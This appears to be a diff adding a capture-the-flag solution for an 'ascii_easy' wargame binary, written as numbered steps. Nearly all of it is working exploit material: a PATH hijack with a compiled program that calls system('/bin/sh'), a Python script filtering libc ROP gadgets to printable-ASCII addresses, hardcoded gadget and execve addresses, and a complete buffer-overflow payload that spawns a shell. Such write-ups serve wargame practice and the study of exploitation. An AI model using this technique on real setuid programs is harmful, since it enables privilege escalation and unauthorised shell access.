@@ -1,0 +1,41 @@
+1. export PATH=/tmp/banjjak2:$PATH [ /tmp/banjjak2 is your temp directory. ]
+
+2. create a source file and compile it. (compile option : gcc -o h h.c -m32)
+
+//h.c
+#include <stdlib.h>
+
+int main(){
+	system("/bin/sh");
+}
+
+3. ROPgadget
+ROPgadget --binary libc-2.15.so > rop
+
+4. Get all offset values in libc-2.15.so in the range of ASCII values.
+[python code]
+f = open('./rop', 'r')
+
+data = f.read()
+data = data.split('\n')
+f.close()
+
+BASE = 0x5555e000
+
+f2 = open('./gadget', 'w')
+
+for i in range(2, len(data)-3):
+	addr = hex(BASE + int(data[i][:10], 16))
+	if((0x20 <= int(addr[2:4], 16) <= 0x7f) & (0x20 <= int(addr[4:6], 16) <= 0x7f) & (0x20 <= int(addr[6:8], 16) <= 0x7f) & (0x20 <= int(addr[8:10], 16) <= 0x7f)):
+		print f2.write(data[i] + ' [' + str(addr)  + ']' + '\n')
+f2.close()
+
+5. Get execve call address (with IDA) == 0x55636b77
+
+6. Get pppr and ppppr and string 'h' address
+ppppr = 0x55646369
+pppr = 0x5564636c
+string 'h' = 0x55565d3c
+
+7. full payload
+ascii_easy@ubuntu:/tmp/banjjak2$ /home/ascii_easy/ascii_easy `python -c 'print "A"*32 + "\x6c\x63\x64\x55" + "B"*12 + "\x6c\x63\x64\x55" + "B"*12 + "\x69\x63\x64\x55" + "B"*16 + "\x77\x6b\x63\x55" + "\x3c\x5d\x56\x55"'`
